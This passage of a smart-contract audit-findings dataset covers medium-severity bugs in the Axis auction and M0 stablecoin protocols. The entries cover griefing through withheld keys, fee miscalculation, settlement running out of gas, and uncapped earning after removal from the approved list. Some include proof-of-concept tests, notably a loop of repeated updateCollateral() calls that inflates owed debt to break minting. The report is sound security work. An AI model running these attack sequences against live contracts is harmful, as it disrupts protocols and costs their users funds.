internal\n        override\n        returns (Settlement memory settlement_, bytes memory auctionOutput_)\n    {\n        // Settle the auction\n        // Check that auction is in the right state for settlement\n        if (auctionData[lotId_].status != Auction.Status.Decrypted) {\n            revert Auction_WrongState(lotId_);\n        }\n```\n\nFor EMPAM auctions, the private key associated with the auction has to be submitted before the auction can be settled. In auctions where the private key is held by the seller, they can grief the bidder's or in cases where a key management solution is used, both seller and bidder's can be griefed by not submitting the private key.чAcknowledge the risk involved for the seller and bidder\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/143\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#143\nFixed Now bidder's can claim refund unless the private key is submitted following a dedicatedSettlePeriod\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чUser's will not be able to claim their assets in case the private key holder doesn't submit the key for decryption\nCode Snippet\nTool used\nManual Review
Bidder's payout claim could fail due to validation checks in LinearVestingчmediumч"```\n    function _sendPayout(\n        address recipient_,\n        uint256 payoutAmount_,\n        Routing memory routingParams_,\n        bytes memory\n    ) internal {\n        \n        if (fromVeecode(derivativeReference) == bytes7("""")) {\n            Transfer.transfer(baseToken, recipient_, payoutAmount_, true);\n        }\n        else {\n            \n            DerivativeModule module = DerivativeModule(_getModuleIfInstalled(derivativeReference));\n\n            Transfer.approve(baseToken, address(module), payoutAmount_);\n\n=>          module.mint(\n                recipient_,\n                address(baseToken),\n                routingParams_.derivativeParams,\n                payoutAmount_,\n                routingParams_.wrapDerivative\n            );\n```\n"ч"Bidder's payout claim will fail due to validation checks in LinearVesting after the expiry timestamp\nBidder's payout are sent by internally calling the `_sendPayout` function. In case the payout is a derivative which has already expired, this will revert due to the validation check of `block.timestmap < expiry` present in the mint function of LinearVesting derivative\n```\n    function _sendPayout(\n        address recipient_,\n        uint256 payoutAmount_,\n        Routing memory routingParams_,\n        bytes memory\n    ) internal {\n        \n        if (fromVeecode(derivativeReference) == bytes7("""")) {\n            Transfer.transfer(baseToken, recipient_, payoutAmount_, true);\n        }\n        else {\n            \n            DerivativeModule module = DerivativeModule(_getModuleIfInstalled(derivativeReference));\n\n            Transfer.approve(baseToken, address(module), payoutAmount_);\n\n=>          module.mint(\n                recipient_,\n                address(baseToken),\n                routingParams_.derivativeParams,\n                payoutAmount_,\n                routingParams_.wrapDerivative\n            );\n```\n\n```\n    function mint(\n        address to_,\n        address underlyingToken_,\n        bytes memory params_,\n        uint256 amount_,\n        bool wrapped_\n    )\n        external\n        virtual\n        override\n        returns (uint256 tokenId_, address wrappedAddress_, uint256 amountCreated_)\n    {\n        if (amount_ == 0) revert InvalidParams();\n\n        VestingParams memory params = _decodeVestingParams(params_);\n\n        if (_validate(underlyingToken_, params) == false) {\n            revert InvalidParams();\n        }\n```\n\n```\n    function _validate(\n        address underlyingToken_,\n        VestingParams memory data_\n    ) internal view returns (bool) {\n        \n        // rest of code.\n\n=>      if (data_.expiry < block.timestamp) return false;\n\n\n        // Check that the underlying token is not 0\n        if (underlyingToken_ == address(0)) return false;\n\n\n        return true;\n    }\n```\n\nHence the user's won't be able to claim their payouts of an auction once the derivative has expired. For EMPAM auctions, a seller can also wait till this timestmap passes before revealing their private key which will disallow bidders from claiming their rewards."чAllow to mint tokens even after expiry of the vesting token / deploy the derivative token first itself and when making the payout, transfer the base token directly incase the expiry time is passed\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/116\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#116\nFixed The expiry check is now removed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чBidder's won't be able claim payouts from auction after the derivative expiry timestamp\nCode Snippet\nTool used\nManual Review
Inaccurate value is used for partial fill quote amount when calculating feesчmediumч```\n    function claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {\n        \n        // rest of code.\n\n        for (uint256 i = 0; i < bidClaimsLen; i++) {\n            Auction.BidClaim memory bidClaim = bidClaims[i];\n\n            if (bidClaim.payout > 0) {\n               \n=>              _allocateQuoteFees(\n                    protocolFee,\n                    referrerFee,\n                    bidClaim.referrer,\n                    routing.seller,\n                    routing.quoteToken,\n=>                  bidClaim.paid\n                );\n```\nчInaccurate value is used for partial fill quote amount when calculating fees which can cause reward claiming / payment withdrawal to revert\nThe fees of an auction is managed as follows:\nWhenever a bidder claims their payout, calculate the amount of quote tokens that should be collected as fees (instead of giving the entire quote amount to the seller) and add this to the protocol / referrers rewards\n```\n    function claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {\n        \n        // rest of code.\n\n        for (uint256 i = 0; i < bidClaimsLen; i++) {\n            Auction.BidClaim memory bidClaim = bidClaims[i];\n\n            if (bidClaim.payout > 0) {\n               \n=>              _allocateQuoteFees(\n                    protocolFee,\n                    referrerFee,\n                    bidClaim.referrer,\n                    routing.seller,\n                    routing.quoteToken,\n=>                  bidClaim.paid\n                );\n```\n\nHere bidClaim.paid is the amount of quote tokens that was transferred in by the bidder for the purchase\n```\n    function _allocateQuoteFees(\n        uint96 protocolFee_,\n        uint96 referrerFee_,\n        address referrer_,\n        address seller_,\n        ERC20 quoteToken_,\n        uint96 amount_\n    ) internal returns (uint96 totalFees) {\n        // Calculate fees for purchase\n        (uint96 toReferrer, uint96 toProtocol) = calculateQuoteFees(\n            protocolFee_, referrerFee_, referrer_ != address(0) && referrer_ != seller_, amount_\n        );\n\n        // Update fee balances if non-zero\n        if (toReferrer > 0) rewards[referrer_][quoteToken_] += uint256(toReferrer);\n        if (toProtocol > 0) rewards[_protocol][quoteToken_] += uint256(toProtocol);\n\n\n        return toReferrer + toProtocol;\n    }\n```\n\nWhenever the seller calls claimProceeds to withdraw the amount of quote tokens received from the auction, subtract the quote fees and give out the remaining\n```\n    function claimProceeds(\n        uint96 lotId_,\n        bytes calldata callbackData_\n    ) external override nonReentrant {\n        \n        // rest of code.\n        \n        uint96 totalInLessFees;\n        {\n=>          (, uint96 toProtocol) = calculateQuoteFees(\n                lotFees[lotId_].protocolFee, lotFees[lotId_].referrerFee, false, purchased_\n            );\n            unchecked {\n=>              totalInLessFees = purchased_ - toProtocol;\n            }\n        }\n```\n\nHere purchased is the total quote token amount that was collected for this auction.\nIn case the fees calculated in claimProceeds is less than the sum of fees allocated to the protocol / referrer via claimBids, there will be a mismatch causing the sum of (fees allocated + seller purchased quote tokens) to be greater than the total quote token amount that was transferred in for the auction. This could cause either the protocol/referrer to not obtain their rewards or the seller to not be able to claim the purchased tokens in case there are no excess quote token present in the auction house contract.\nIn case, totalPurchased is >= sum of all individual bid quote token amounts (as it is supposed to be), the fee allocation would be correct. But due to the inaccurate computation of the input quote token amount associated with a partial fill, it is possible for the above scenario (ie. fees calculated in claimProceeds is less than the sum of fees allocated to the protocol / referrer via claimBids) to occur\n```\n    function settle(uint96 lotId_) external override nonReentrant {\n        \n        // rest of code.\n\n            if (settlement.pfBidder != address(0)) {\n\n                _allocateQuoteFees(\n                    feeData.protocolFee,\n                    feeData.referrerFee,\n                    settlement.pfReferrer,\n                    routing.seller,\n                    routing.quoteToken,\n\n                    // @audit this method of calculating the input quote token amount associated with a partial fill is not accurate\n                    uint96(\n=>                      Math.mulDivDown(\n                            settlement.pfPayout, settlement.totalIn, settlement.totalOut\n                        )\n                    )\n```\n\nThe above method of calculating the input token amount associated with a partial fill can cause this value to be higher than the acutal value and hence the fees allocated will be less than what the fees that will be captured from the seller will be\nPOC\nIt is asserted that the tokens allocated as fees is greater than the tokens that will be captured from a seller for feesчUse `bidAmount - pfRefund` as the quote token input amount value instead of computing the current way\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/140\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#140\nFixed The partial bid amount for quote fees is now calculated as `bidClaim.paid - bidClaim.refund`\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чRewards might not be collectible or seller might not be able to claim the proceeds due to lack of tokens\nCode Snippet\nTool used\nManual Review
Settlement of batch auction can exceed the gas limitчmediumч```\n// Remove the line below\n   uint24 internal constant _MIN_BID_PERCENT = 1000; // 1%\n// Add the line below\n   uint24 internal constant _MIN_BID_PERCENT = 100; // 0.1%\n```\nчSettlement of batch auction can exceed the gas limit, making it impossible to settle the auction.\nWhen a batch auction (EMPAM) is settled, to calculate the lot marginal price, the contract iterates over all bids until the capacity is reached or a bid below the minimum price is found.\nAs some of the operations performed in the loop are gas-intensive, the contract may run out of gas if the number of bids is too high.\nNote that additionally, there is another loop in the `_settle` function that iterates over all the remaining bids to delete them from the queue. While this loop consumes much less gas per iteration and would require the number of bids to be much higher to run out of gas, it adds to the problem.\n```\n// Remove the line below\n   uint24 internal constant _MIN_BID_PERCENT = 1000; // 1%\n// Add the line below\n   uint24 internal constant _MIN_BID_PERCENT = 100; // 0.1%\n```\n\n```\nmodifier givenBidsCreated() {\n    uint96 amountOut = 0.01e18;\n    uint96 amountIn = 0.01e18;\n    uint256 numBids = 580;\n\n    for (uint256 i = 0; i < numBids; i++) {\n        _createBid(_BIDDER, amountIn, amountOut);\n    }\n    \n    _;\n}\n\nfunction test_settleOog() external\n    givenLotIsCreated\n    givenLotHasStarted\n    givenBidsCreated\n    givenLotHasConcluded\n    givenPrivateKeyIsSubmitted\n    givenLotIsDecrypted\n{        \n    uint256 gasBefore = gasleft();\n    _settle();\n\n    assert(gasBefore - gasleft() > 30_000_000);\n}\n```\n\nTool used\nManual ReviewчA more appropriate solution, if it is not acceptable to increase the min bid percent, would be to change the settlement logic so that can be handled in batches of bids to avoid running out of gas.\nIn both cases, it would also be recommended to limit the number of decrypted bids that can be deleted from the queue in a single transaction.\nDiscussion\nOighty\nAcknowledge. This is valid. We had changed the queue implementation to be less gas intensive on inserts, but it ended up making removals (i.e. settle) more expensive. A priority for us is supporting as many bids on settlement as we can (which allows smaller bid sizes). We're likely going to switch to a linked list implementation to achieve this.\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/137\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#137\nFixed The implementation is changed from heap to linked list to reduce the gas cost and the max bid count for settlement is reduced to 2500 making the max gas expenditure around 8million for settlement\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чSettlement of batch auction will revert, causing sellers and bidders to lose their funds.\nCode Snippet
An earner can still continue earning even after being removed from the approved list.чmediumч```\n    function rate() external view returns (uint256) {\n        uint256 safeEarnerRate_ = getSafeEarnerRate(\n            IMinterGateway(minterGateway).totalActiveOwedM(),\n            IMToken(mToken).totalEarningSupply(),\n            IMinterGateway(minterGateway).minterRate()\n        );\n\n        return UIntMath.min256(maxRate(), (RATE_MULTIPLIER * safeEarnerRate_) / ONE);\n    }\n\n    function getSafeEarnerRate(\n        uint240 totalActiveOwedM_,\n        uint240 totalEarningSupply_,\n        uint32 minterRate_\n    ) public pure returns (uint32) {\n        // solhint-disable max-line-length\n        // When `totalActiveOwedM_ >= totalEarningSupply_`, it is possible for the earner rate to be higher than the\n        // minter rate and still ensure cashflow safety over some period of time (`RATE_CONFIDENCE_INTERVAL`). To ensure\n        // cashflow safety, we start with `cashFlowOfActiveOwedM >= cashFlowOfEarningSupply` over some time `dt`.\n        // Effectively: p1 * (exp(rate1 * dt) - 1) >= p2 * (exp(rate2 * dt) - 1)\n        //          So: rate2 <= ln(1 + (p1 * (exp(rate1 * dt) - 1)) / p2) / dt\n        // 1. totalActive * (delta_minterIndex - 1) >= totalEarning * (delta_earnerIndex - 1)\n        // 2. totalActive * (delta_minterIndex - 1) / totalEarning >= delta_earnerIndex - 1\n        // 3. 1 + (totalActive * (delta_minterIndex - 1) / totalEarning) >= delta_earnerIndex\n        // Substitute `delta_earnerIndex` with `exponent((earnerRate * dt) / SECONDS_PER_YEAR)`:\n        // 4. 1 + (totalActive * (delta_minterIndex - 1) / totalEarning) >= exponent((earnerRate * dt) / SECONDS_PER_YEAR)\n        // 5. ln(1 + (totalActive * (delta_minterIndex - 1) / totalEarning)) >= (earnerRate * dt) / SECONDS_PER_YEAR\n        // 6. ln(1 + (totalActive * (delta_minterIndex - 1) / totalEarning)) * SECONDS_PER_YEAR / dt >= earnerRate\n\n        // When `totalActiveOwedM_ < totalEarningSupply_`, the instantaneous earner cash flow must be less than the\n        // instantaneous minter cash flow. To ensure instantaneous cashflow safety, we we use the derivatives of the\n        // previous starting inequality, and substitute `dt = 0`.\n        // Effectively: p1 * rate1 >= p2 * rate2\n        //          So: rate2 <= p1 * rate1 / p2\n        // 1. totalActive * minterRate >= totalEarning * earnerRate\n        // 2. totalActive * minterRate / totalEarning >= earnerRate\n        // solhint-enable max-line-length\n\n        if (totalActiveOwedM_ == 0) return 0;\n\n        if (totalEarningSupply_ == 0) return type(uint32).max;\n\n        if (totalActiveOwedM_ <= totalEarningSupply_) {//@audit-info rate is slashed\n            // NOTE: `totalActiveOwedM_ * minterRate_` can revert due to overflow, so in some distant future, a new\n            //       rate model contract may be needed that handles this differently.\n            return uint32((uint256(totalActiveOwedM_) * minterRate_) / totalEarningSupply_);\n        }\n\n        uint48 deltaMinterIndex_ = ContinuousIndexingMath.getContinuousIndex(\n            ContinuousIndexingMath.convertFromBasisPoints(minterRate_),\n            RATE_CONFIDENCE_INTERVAL\n        );//@audit-info deltaMinterIndex for 30 days\n\n        // NOTE: `totalActiveOwedM_ * deltaMinterIndex_` can revert due to overflow, so in some distant future, a new\n        //       rate model contract may be needed that handles this differently.\n        int256 lnArg_ = int256(\n            _EXP_SCALED_ONE +\n                ((uint256(totalActiveOwedM_) * (deltaMinterIndex_ - _EXP_SCALED_ONE)) / totalEarningSupply_)\n        );\n\n        int256 lnResult_ = wadLn(lnArg_ * _WAD_TO_EXP_SCALER) / _WAD_TO_EXP_SCALER;\n\n        uint256 expRate_ = (uint256(lnResult_) * ContinuousIndexingMath.SECONDS_PER_YEAR) / RATE_CONFIDENCE_INTERVAL;\n\n        if (expRate_ > type(uint64).max) return type(uint32).max;\n\n        // NOTE: Do not need to do `UIntMath.safe256` because it is known that `lnResult_` will not be negative.\n        uint40 safeRate_ = ContinuousIndexingMath.convertToBasisPoints(uint64(expRate_));\n\n        return (safeRate_ > type(uint32).max) ? type(uint32).max : uint32(safeRate_);\n    }\n```\nчAn earner can still continue earning even after being removed from the approved list.\nA `M` holder is eligible to earn the `Earner Rate` when they are approved by TTG. The approved `M` holder can call `startEarning()` then begin to earn the `Earner Rate`. They also can `stopEarning()` to quit earning.\nHowever, when an approved `M` holder is disapproved, only the disapproved holder themselves can choose to stop earning; no one else has the authority to force them to quit earning.\n`Earner Rate` is calculated in `StableEarnerRateModel#rate()` as below:\n```\n    function rate() external view returns (uint256) {\n        uint256 safeEarnerRate_ = getSafeEarnerRate(\n            IMinterGateway(minterGateway).totalActiveOwedM(),\n            IMToken(mToken).totalEarningSupply(),\n            IMinterGateway(minterGateway).minterRate()\n        );\n\n        return UIntMath.min256(maxRate(), (RATE_MULTIPLIER * safeEarnerRate_) / ONE);\n    }\n\n    function getSafeEarnerRate(\n        uint240 totalActiveOwedM_,\n        uint240 totalEarningSupply_,\n        uint32 minterRate_\n    ) public pure returns (uint32) {\n        // solhint-disable max-line-length\n        // When `totalActiveOwedM_ >= totalEarningSupply_`, it is possible for the earner rate to be higher than the\n        // minter rate and still ensure cashflow safety over some period of time (`RATE_CONFIDENCE_INTERVAL`). To ensure\n        // cashflow safety, we start with `cashFlowOfActiveOwedM >= cashFlowOfEarningSupply` over some time `dt`.\n        // Effectively: p1 * (exp(rate1 * dt) - 1) >= p2 * (exp(rate2 * dt) - 1)\n        //          So: rate2 <= ln(1 + (p1 * (exp(rate1 * dt) - 1)) / p2) / dt\n        // 1. totalActive * (delta_minterIndex - 1) >= totalEarning * (delta_earnerIndex - 1)\n        // 2. totalActive * (delta_minterIndex - 1) / totalEarning >= delta_earnerIndex - 1\n        // 3. 1 + (totalActive * (delta_minterIndex - 1) / totalEarning) >= delta_earnerIndex\n        // Substitute `delta_earnerIndex` with `exponent((earnerRate * dt) / SECONDS_PER_YEAR)`:\n        // 4. 1 + (totalActive * (delta_minterIndex - 1) / totalEarning) >= exponent((earnerRate * dt) / SECONDS_PER_YEAR)\n        // 5. ln(1 + (totalActive * (delta_minterIndex - 1) / totalEarning)) >= (earnerRate * dt) / SECONDS_PER_YEAR\n        // 6. ln(1 + (totalActive * (delta_minterIndex - 1) / totalEarning)) * SECONDS_PER_YEAR / dt >= earnerRate\n\n        // When `totalActiveOwedM_ < totalEarningSupply_`, the instantaneous earner cash flow must be less than the\n        // instantaneous minter cash flow. To ensure instantaneous cashflow safety, we we use the derivatives of the\n        // previous starting inequality, and substitute `dt = 0`.\n        // Effectively: p1 * rate1 >= p2 * rate2\n        //          So: rate2 <= p1 * rate1 / p2\n        // 1. totalActive * minterRate >= totalEarning * earnerRate\n        // 2. totalActive * minterRate / totalEarning >= earnerRate\n        // solhint-enable max-line-length\n\n        if (totalActiveOwedM_ == 0) return 0;\n\n        if (totalEarningSupply_ == 0) return type(uint32).max;\n\n        if (totalActiveOwedM_ <= totalEarningSupply_) {//@audit-info rate is slashed\n            // NOTE: `totalActiveOwedM_ * minterRate_` can revert due to overflow, so in some distant future, a new\n            //       rate model contract may be needed that handles this differently.\n            return uint32((uint256(totalActiveOwedM_) * minterRate_) / totalEarningSupply_);\n        }\n\n        uint48 deltaMinterIndex_ = ContinuousIndexingMath.getContinuousIndex(\n            ContinuousIndexingMath.convertFromBasisPoints(minterRate_),\n            RATE_CONFIDENCE_INTERVAL\n        );//@audit-info deltaMinterIndex for 30 days\n\n        // NOTE: `totalActiveOwedM_ * deltaMinterIndex_` can revert due to overflow, so in some distant future, a new\n        //       rate model contract may be needed that handles this differently.\n        int256 lnArg_ = int256(\n            _EXP_SCALED_ONE +\n                ((uint256(totalActiveOwedM_) * (deltaMinterIndex_ - _EXP_SCALED_ONE)) / totalEarningSupply_)\n        );\n\n        int256 lnResult_ = wadLn(lnArg_ * _WAD_TO_EXP_SCALER) / _WAD_TO_EXP_SCALER;\n\n        uint256 expRate_ = (uint256(lnResult_) * ContinuousIndexingMath.SECONDS_PER_YEAR) / RATE_CONFIDENCE_INTERVAL;\n\n        if (expRate_ > type(uint64).max) return type(uint32).max;\n\n        // NOTE: Do not need to do `UIntMath.safe256` because it is known that `lnResult_` will not be negative.\n        uint40 safeRate_ = ContinuousIndexingMath.convertToBasisPoints(uint64(expRate_));\n\n        return (safeRate_ > type(uint32).max) ? type(uint32).max : uint32(safeRate_);\n    }\n```\n\nAs we can see, the rate may vary due to the changes in `MToken#totalEarningSupply()`, therefore the earning of fixed principal amount could be decreased if `totalEarningSupply()` increases. In some other cases the total earning rewards increases significantly if `totalEarningSupply()` increases, resulting in less `excessOwedM` sending to `ttgVault` when `MinterGateway#updateIndex()` is called.\n```\n    function test_AliceStillEarnAfterDisapproved() external {\n\n        _registrar.updateConfig(MAX_EARNER_RATE, 40000);\n        _minterGateway.activateMinter(_minters[0]);\n\n        uint256 collateral = 1_000_000e6;\n        _updateCollateral(_minters[0], collateral);\n\n        _mintM(_minters[0], 400e6, _bob);\n        _mintM(_minters[0], 400e6, _alice);\n        uint aliceInitialBalance = _mToken.balanceOf(_alice);\n        uint bobInitialBalance = _mToken.balanceOf(_bob);\n        //@audit-info alice and bob had the same M balance\n        assertEq(aliceInitialBalance, bobInitialBalance);\n        //@audit-info alice and bob started earning\n        vm.prank(_alice);\n        _mToken.startEarning();\n        vm.prank(_bob);\n        _mToken.startEarning();\n\n        vm.warp(block.timestamp + 1 days);\n        uint aliceEarningDay1 = _mToken.balanceOf(_alice) - aliceInitialBalance;\n        uint bobEarningDay1 = _mToken.balanceOf(_bob) - bobInitialBalance;\n        //@audit-info Alice and Bob have earned the same M in day 1\n        assertNotEq(aliceEarningDay1, 0);\n        assertEq(aliceEarningDay1, bobEarningDay1);\n        //@audit-info Alice was removed from earner list\n        _registrar.removeFromList(TTGRegistrarReader.EARNERS_LIST, _alice);\n        vm.warp(block.timestamp + 1 days);\n        uint aliceEarningDay2 = _mToken.balanceOf(_alice) - aliceInitialBalance - aliceEarningDay1;\n        uint bobEarningDay2 = _mToken.balanceOf(_bob) - bobInitialBalance - bobEarningDay1;\n        //@audit-info Alice still earned M in day 2 even she was removed from earner list, the amount of which is same as Bob's earning\n        assertNotEq(aliceEarningDay2, 0);\n        assertEq(aliceEarningDay2, bobEarningDay2);\n\n        uint earnerRateBefore = _mToken.earnerRate();\n        //@audit-info Only Alice can stop herself from earning\n        vm.prank(_alice);\n        _mToken.stopEarning();\n        uint earnerRateAfter = _mToken.earnerRate();\n        //@audit-info The earning rate was almost doubled after Alice called `stopEarning`\n        assertApproxEqRel(earnerRateBefore*2, earnerRateAfter, 0.01e18);\n        vm.warp(block.timestamp + 1 days);\n        uint aliceEarningDay3 = _mToken.balanceOf(_alice) - aliceInitialBalance - aliceEarningDay1 - aliceEarningDay2;\n        uint bobEarningDay3 = _mToken.balanceOf(_bob) - bobInitialBalance - bobEarningDay1 - bobEarningDay2;\n        //@audit-info Alice earned nothing \n        assertEq(aliceEarningDay3, 0);\n        //@audit-info Bob's earnings on day 3 were almost twice as much as what he earned on day 2.\n        assertApproxEqRel(bobEarningDay2*2, bobEarningDay3, 0.01e18);\n    }\n```\nчIntroduce a method that allows anyone to stop the disapproved earner from earning:\n```\n    function stopEarning(address account_) external {\n        if (_isApprovedEarner(account_)) revert IsApprovedEarner();\n        _stopEarning(account_);\n    }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; medium(2)\ntoninorair\nValid issue, medium severity. Great catch 👍чThe earnings of eligible users could potentially be diluted.\nThe `excessOwedM` to ZERO vault holders could be diluted\nCode Snippet\nTool used\nManual Review
Malicious minters can repeatedly penalize their undercollateralized accounts in a short peroid of time, which can result in disfunctioning of critical protocol functions, such as `mintM`.чmediumч```\n  penalty: 1 94536959275 94536000000\n  penalty: 2 95482328867 95481360000\n  penalty: 3 96437152156 96436173600\n  penalty: 4 97401523678 97400535336\n  penalty: 5 98375538914 98374540689\n  penalty: 6 99359294302 99358286095\n  penalty: 7 100352887244 100351868955\n  penalty: 8 101356416116 101355387644\n  penalty: 9 102369980277 102368941520\n  penalty: 10 103393680080 103392630935\n  // rest of code\n  penalty: 5990 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5991 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5992 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5993 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5994 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5995 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5996 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5997 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5998 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5999 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 6000 5192349545726433803396851311815959 5192296858534827628530496329220095\n```\nч"Malicious minters can exploit the `updateCollateral()` function to repeatedly penalize their undercollateralized accounts in a short peroid of time. This can make the `principalOfTotalActiveOwedM` to reach `uint112.max` limit, disfunctioning some critical functions, such as `mintM`.\nThe `updateCollateral()` function allows minters to update their collateral status to the protocol, with penalties imposed in two scenarios:\nA penalty is imposed for each missing collateral update interval.\nA penalty is imposed if a minter is undercollateralized.\nThe critical issue arises with the penalty for being undercollateralized, which is imposed on each call to `updateCollateral()`. This penalty is compounded, calculated as `penaltyRate * (principalOfActiveOwedM_ - principalOfMaxAllowedActiveOwedM_)`, and the `principalOfActiveOwedM_` increases with each imposed penalty.\nGiven that validator provides timely information about the off-chain collateral (according to https://docs.m0.org/portal/overview/glossary#validator), a minter could potentially gather validator signatures with high frequency (for example, every minute). With a sufficient collection of signatures, a malicious minter could launch an attack in a very short timeframe, not giving validators time to deactivate the minter.\nProof Of Concept\nWe can do a simple calculation, using the numbers from unit tests, mintRatio=90%, penaltyRate=1%, updateCollateralInterval=2000 (seconds). A malicious minter deposits `$100,000` t-bills as collateral, and mints `$90,000` M tokens. Since M tokens have 6 decimals, the collateral would be `100000e6`. Following the steps below, the malicious minter would be able to increase `principalOfActiveOwedM_` close to uint112.max limit:\nDeposit collateral and mint M tokens.\nWait for 4 collateral update intervals. This is for accumulating some initial penalty to get undercollateralized.\nCall `updateCollateral()`. The penalty for missing updates would be 4 * 90000e6 * 1% = `36e8`.\nStarting from `36e8`, we can keep calling `updateCollateral()` to compound penalty for undercollateralization. Each time would increase the penalty by 1%. We only need log(2^112 / `36e8`, 1.01) ~ 5590 times to hit `uint112.max` limit.\n```\n  penalty: 1 94536959275 94536000000\n  penalty: 2 95482328867 95481360000\n  penalty: 3 96437152156 96436173600\n  penalty: 4 97401523678 97400535336\n  penalty: 5 98375538914 98374540689\n  penalty: 6 99359294302 99358286095\n  penalty: 7 100352887244 100351868955\n  penalty: 8 101356416116 101355387644\n  penalty: 9 102369980277 102368941520\n  penalty: 10 103393680080 103392630935\n  // rest of code\n  penalty: 5990 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5991 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5992 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5993 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5994 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5995 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5996 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5997 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5998 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5999 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 6000 5192349545726433803396851311815959 5192296858534827628530496329220095\n```\n\n```\n    // Using default test settings: mintRatio = 90%, penaltyRate = 1%, updateCollateralInterval = 2000.\n    function test_penaltyForUndercollateralization() external {\n        // 1. Minter1 deposits $100,000 t-bills, and mints 90,000 $M Tokens.\n        uint initialTimestamp = block.timestamp;\n        _minterGateway.setCollateralOf(_minter1, 100000e6);\n        _minterGateway.setUpdateTimestampOf(_minter1, initialTimestamp);\n        _minterGateway.setRawOwedMOf(_minter1, 90000e6);\n        _minterGateway.setPrincipalOfTotalActiveOwedM(90000e6);\n\n        // 2. Minter does not update for 4 updateCollateralIntervals, causing penalty for missing updates.\n        vm.warp(initialTimestamp + 4 * _updateCollateralInterval);\n\n        // 3. Minter fetches a lot of signatures from validator, each with different timestamp and calls `updateCollateral()` many times.\n        //    Since the penalty for uncollateralization is counted every time, and would hit `uint112.max` at last.\n        uint256[] memory retrievalIds = new uint256[](0);\n        address[] memory validators = new address[](1);\n        validators[0] = _validator1;\n\n        for (uint i = 1; i <= 6000; ++i) {\n\n            uint256[] memory timestamps = new uint256[](1);\n            uint256 signatureTimestamp = initialTimestamp + i;\n            timestamps[0] = signatureTimestamp;\n            bytes[] memory signatures = new bytes[](1);\n            signatures[0] = _getCollateralUpdateSignature(\n                address(_minterGateway),\n                _minter1,\n                100000e6,\n                retrievalIds,\n                bytes32(0),\n                signatureTimestamp,\n                _validator1Pk\n            );\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(100000e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            console.log(""penalty:"", i, _minterGateway.totalActiveOwedM(), _minterGateway.principalOfTotalActiveOwedM());\n        }\n    }\n```\n\nNote that in real use case, the penalty rate may lower (e.g. 0.1%), however, `log(2^112 / 36e8, 1.001) ~ 55656` is still a reasonable amount since there are 1440 minutes in 1 day (not to mention if the frequency for signature may be higher than once per minute). A malicious minter can still gather enough signatures for the attack."чConsider only imposing penalty for undercollateralization for each update interval.\nDiscussion\nsherlock-admin4\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\n6000 signatures will definately ring a bell for the validator to check for malicious activity; remember the validator atest to the eligible collatreal.\ndeluca-mike\nWhile a valid finding, it would require validators and governance to really be sleeping at the wheel and/or behaving on reckless autopilot.\nWe should probably fix it by preventing the update collateral from penalizing the minter more than once per missed update.\nHowever, consider than by attempting to do this, the Minter is losing all their off-chain collateral and being deactivated, and the reckless validators will likely lose their validator gig.\ntoninorair\nValid issue, medium severity, great catch 👍\npasha9990\nI think this not valid because we need signature and new timestamp for every update and that is impossibleчThe direct impact is that `principalOfTotalActiveOwedM` will hit `uint112.max` limit. All related protocol features would be disfunctioned, the most important one being `mintM`, since the function would revert if `principalOfTotalActiveOwedM` hits `uint112.max` limit.\n```\n        unchecked {\n            uint256 newPrincipalOfTotalActiveOwedM_ = uint256(principalOfTotalActiveOwedM_) + principalAmount_;\n\n            // As an edge case precaution, prevent a mint that, if all owed M (active and inactive) was converted to\n            // a principal active amount, would overflow the `uint112 principalOfTotalActiveOwedM`.\n>           if (\n>               // NOTE: Round the principal up for worst case.\n>               newPrincipalOfTotalActiveOwedM_ + _getPrincipalAmountRoundedUp(totalInactiveOwedM) >= type(uint112).max\n>           ) {\n>               revert OverflowsPrincipalOfTotalOwedM();\n>           }\n\n            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);\n            _rawOwedM[msg.sender] += principalAmount_; // Treat rawOwedM as principal since minter is active.\n        }\n```\n\nCode Snippet\nTool used\nFoundary
